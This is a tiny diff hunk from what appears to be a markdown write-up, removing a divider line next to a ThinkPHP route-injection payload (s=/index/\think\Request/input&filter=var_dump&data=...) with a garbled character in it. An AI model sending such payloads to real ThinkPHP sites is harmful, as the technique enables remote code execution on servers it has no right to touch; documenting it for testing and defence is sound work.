@@ -71,7 +71,6 @@
 s\=/index/\\think\\Request/input&filter\=var_dump&data\�d3e827b198d120okhacked
 ```
 
----
 
 * `s=/index/\think\Request/input`
 
